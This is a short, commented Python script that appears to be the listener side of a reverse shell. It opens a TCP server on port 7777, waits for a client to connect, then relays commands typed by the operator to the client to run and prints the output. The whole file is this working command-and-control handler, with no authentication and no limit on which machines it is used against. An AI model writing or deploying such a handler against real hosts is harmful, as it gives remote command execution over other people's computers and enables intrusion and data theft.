import socket
import sys

# Define the host and port for the server
HOST = ""
PORT = 7777

# Create a socket object
s = socket.socket()

# Bind the socket to the host and port
s.bind((HOST, PORT))

# Start listening for incoming connections (up to 5)
s.listen(5)
print(f"Listening on port {PORT}...")

# Accept a connection from a client
conn, address = s.accept()
print(f"Connection established with IP {address[0]} on port {address[1]}")

# First hello message to the client
conn.send(str.encode("hello"))
client_response = str(conn.recv(1024), "utf-8")
print(client_response, end="")

# Subsequent commands to run on the client
while True:
    cmd = input()
    
    # If the command is 'quit', send the command to the client, close the connection and exit
    if cmd == 'quit':
        conn.send(str.encode(cmd))
        conn.close()
        s.close()
        sys.exit()
    
    # If the command is not empty, send it to the client
    if len(str.encode(cmd)) > 0:
        conn.send(str.encode(cmd))
        
        # Receive the response from the client
        client_response = str(conn.recv(1024), "utf-8")
        
        # Print the client's response
        print(client_response, end="")

# Close the connection (this line will never be reached due to the infinite loop)
conn.close()